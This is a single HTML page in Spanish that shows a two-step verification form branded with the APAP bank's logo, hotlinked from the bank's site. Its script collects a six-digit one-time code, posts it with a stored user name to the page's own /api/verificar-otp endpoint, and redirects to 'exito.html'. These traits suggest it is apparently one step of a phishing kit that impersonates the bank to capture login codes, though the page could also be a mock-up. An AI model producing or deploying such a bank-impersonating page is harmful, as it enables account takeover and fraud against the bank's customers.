<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APAP - Verificación</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            font-family: Arial, sans-serif;
        }
        .otp-container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            max-width: 150px;
        }
        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
        }
        .otp-input {
            width: 40px;
            height: 50px;
            text-align: center;
            font-size: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .btn-verify {
            width: 100%;
            padding: 10px;
            margin-top: 15px;
        }
        .resend-link {
            margin-top: 15px;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="otp-container">
            <div class="logo">
                <img src="https://www.apap.com.do/images/logo.png" alt="APAP Logo">
            </div>
            <h4>Verificación en dos pasos</h4>
            <p>Ingrese el código de verificación que hemos enviado a:</p>
            <p id="contact-info" class="fw-bold">usuario@ejemplo.com</p>
            
            <form id="otpForm">
                <div class="otp-inputs">
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" inputmode="numeric" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" inputmode="numeric" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" inputmode="numeric" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" inputmode="numeric" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" inputmode="numeric" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="\d" inputmode="numeric" required>
                </div>
                <input type="hidden" id="otpCode">
                <button type="submit" class="btn btn-primary btn-verify">Verificar Código</button>
            </form>
            
            <a href="#" class="resend-link" id="resendOtp">Reenviar código</a>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Auto-focus y navegación entre campos OTP
        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                updateOtpCode();
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        function updateOtpCode() {
            const otp = Array.from(otpInputs).map(input => input.value).join('');
            document.getElementById('otpCode').value = otp;
        }

        // Enviar código OTP
        document.getElementById('otpForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const otp = document.getElementById('otpCode').value;
            const usuario = localStorage.getItem('usuario');

            try {
                const response = await fetch('/api/verificar-otp', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ usuario, otp })
                });
                
                const data = await response.json();
                if (data.success) {
                    window.location.href = '/exito.html';
                } else {
                    alert(data.message || 'Código incorrecto');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error al verificar el código');
            }
        });

        // Reenviar código OTP
        document.getElementById('resendOtp').addEventListener('click', async function(e) {
            e.preventDefault();
            const usuario = localStorage.getItem('usuario');
            
            try {
                const response = await fetch('/api/reenviar-otp', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ usuario })
                });
                
                const data = await response.json();
                if (data.success) {
                    alert('Código reenviado correctamente');
                } else {
                    alert(data.message || 'Error al reenviar el código');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error al conectar con el servidor');
            }
        });
    </script>
</body>
</html>
